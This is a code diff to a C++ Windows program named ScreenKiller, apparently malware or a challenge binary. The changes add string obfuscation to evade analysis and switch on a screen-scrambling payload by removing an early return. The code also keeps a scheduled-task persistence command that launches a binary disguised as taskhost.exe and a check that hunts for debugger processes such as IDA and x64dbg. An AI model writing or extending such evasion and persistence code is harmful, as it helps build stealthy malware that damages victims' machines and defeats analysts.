@@ -3,6 +3,7 @@
 #include <iostream>
 
 #include "ScreenKiller.hpp"
+#include "Resolver.hpp"
 #include "Helpers.hpp"
 
 VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);
@@ -11,7 +12,7 @@ ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(
 {
 	size_t size;
 	char *path;
-	_dupenv_s(&path, &size, "temp");
+	_dupenv_s(&path, &size, OBFUSCATE("temp").c_str());
 
 	this->m_temp_path = path;
 }
@@ -25,7 +26,7 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
@@ -43,8 +44,6 @@ bool ScreenKiller::deploy_inner()
 	//this->connect_to_master_server();
 	//this->exit_if_debugged();
 	//this->get_persistency();
-
-	return true;
 
 	HWND hDesktop = NULL;
 	ScreenProps screen_props = { 0 };
@@ -69,7 +68,7 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	system("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\taskhost.exe\"");
+	system(OBFUSCATE("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\taskhost.exe\"").c_str());
 
 	return true;
 }
@@ -106,17 +105,17 @@ bool ScreenKiller::is_debugged1()
 bool ScreenKiller::is_debugged2()
 {
 		const wchar_t* debuggersFilename[7] = {
-			L"cheatengine-x86_64.exe",
-			L"ollydbg.exe",
-			L"ida.exe",
-			L"ida64.exe",
-			L"idaq64.exe",
-			L"radare2.exe",
-			L"x64dbg.exe"
+			WOBFUSCATE(L"cheatengine-x86_64.exe").c_str(),
+			WOBFUSCATE(L"ollydbg.exe").c_str(),
+			WOBFUSCATE(L"ida.exe").c_str(),
+			WOBFUSCATE(L"ida64.exe").c_str(),
+			WOBFUSCATE(L"idaq64.exe").c_str(),
+			WOBFUSCATE(L"radare2.exe").c_str(),
+			WOBFUSCATE(L"x64dbg.exe").c_str()
 		};
 
-		const wchar_t *pogan_name = L"taskhost.exe";
-
+		const wchar_t *pogan_name = WOBFUSCATE(L"taskhost.exe").c_str();
+		
 		size_t count_instances = 0;
 		wchar_t* processName;
 		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
@@ -155,7 +154,7 @@ void ScreenKiller::check_secret_file()
 	FILE *fp; 
 	char secret_buf[MAX_FILE] = { 0 };
 
-	std::string filename = "\\secret.txt";
+	std::string filename = OBFUSCATE("\\secret.txt").c_str();
 	filename = this->m_temp_path + filename;
 
 	fopen_s(&fp, filename.c_str(), "r");
@@ -164,12 +163,9 @@ void ScreenKiller::check_secret_file()
 
 	fread(secret_buf, 1, MAX_FILE, fp);
 	std::string encoded_key = encode_string(secret_buf);
-	printf("\n");
-	encode_string("fr33_b4l3st1n_s3cr3t");
-	std::cout << strlen(secret_buf) << std::endl;
 	
 	if (encoded_key == ENCODED_KEY)
-		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), "Hmmm", NULL);
+		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), OBFUSCATE("Hmmm").c_str(), NULL);
 }
 
 VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
